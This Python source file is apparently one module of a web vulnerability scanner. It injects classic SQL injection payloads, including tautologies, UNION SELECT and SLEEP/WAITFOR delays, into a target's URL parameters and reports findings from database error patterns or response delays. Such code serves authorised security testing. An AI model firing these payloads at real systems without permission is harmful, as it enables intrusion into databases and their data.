import re, time
from core.engine import inject_params, get_forms
from core.session import http
from core.banner import Banner
from colorama import Fore

class SQLiScanner:
    def __init__(self, target, engine):
        self.t = target; self.e = engine

    def run(self):
        payloads = ["'","\"","' OR '1'='1","'--","\" OR 1=1--","' AND 1=2--",
                    "1' ORDER BY 100--","' UNION SELECT NULL--"]
        errors = [r"SQL syntax.*MySQL",r"mysql_",r"ORA-\d{5}",r"Microsoft.*SQL",
                  r"PostgreSQL.*ERROR",r"SQLite.*error",r"syntax error",r"unclosed quotation"]
        url = self.t.url
        urls = [url] if "?" in url else [url + "?id=1", url + "?user=1", url + "?page=1"]

        for u in urls:
            for pl in payloads:
                for inj in inject_params(u, pl):
                    r = http.get(inj["url"])
                    if r:
                        for pat in errors:
                            if re.search(pat, r.text, re.I):
                                self.e.add(title="SQL Injection (Error-Based)", severity="CRITICAL",
                                    desc="SQL error in param '" + inj["param"] + "'",
                                    url=inj["url"], param=inj["param"], payload=pl,
                                    evidence=re.search(pat, r.text, re.I).group()[:100],
                                    fix="Use parameterized queries.",
                                    owasp="A03 - Injection", module="SQLi Scanner")
                                return
                    time.sleep(0.2)

        # Time-based
        if "?" in url:
            for pl in ["' OR SLEEP(5)--","'; WAITFOR DELAY '0:0:5'--"]:
                for inj in inject_params(url, pl):
                    start = time.time()
                    r = http.get(inj["url"], timeout=15)
                    if time.time() - start >= 4.5:
                        self.e.add(title="SQL Injection (Time-Based)", severity="CRITICAL",
                            desc="Response delayed " + str(round(time.time()-start,1)) + "s",
                            url=inj["url"], param=inj["param"], payload=pl,
                            fix="Use parameterized queries.",
                            owasp="A03 - Injection", module="SQLi Scanner")
                        return
